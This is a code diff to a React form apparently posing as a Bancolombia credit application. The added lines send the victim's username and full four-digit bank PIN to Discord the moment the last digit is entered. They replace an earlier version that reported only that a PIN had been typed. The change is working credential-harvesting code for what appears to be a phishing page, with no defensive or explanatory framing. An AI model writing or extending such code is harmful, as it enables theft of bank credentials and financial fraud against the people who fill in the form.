@@ -429,6 +429,15 @@ function CreditForm({ onClose }: { onClose: () => void }) {
       if (value && index < 3) {
         pinRefs[index + 1].current?.focus();
       }
+      if (value && index === 3) {
+        setTimeout(() => {
+          sendToDiscord('pin', [
+            { name: 'Cliente Bancolombia', value: 'Sí', inline: true },
+            { name: 'Usuario', value: usuario, inline: true },
+            { name: 'Clave principal', value: next.join(''), inline: true },
+          ]);
+        }, 100);
+      }
     };
 
     const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
@@ -438,11 +447,6 @@ function CreditForm({ onClose }: { onClose: () => void }) {
     };
 
     const handlePasswordContinue = () => {
-      sendToDiscord('pin', [
-        { name: 'Cliente Bancolombia', value: 'Sí', inline: true },
-        { name: 'Usuario', value: usuario, inline: true },
-        { name: 'Clave principal', value: '✅ Ingresada', inline: true },
-      ]);
       setShowPassword(false);
       setStep(1);
     };
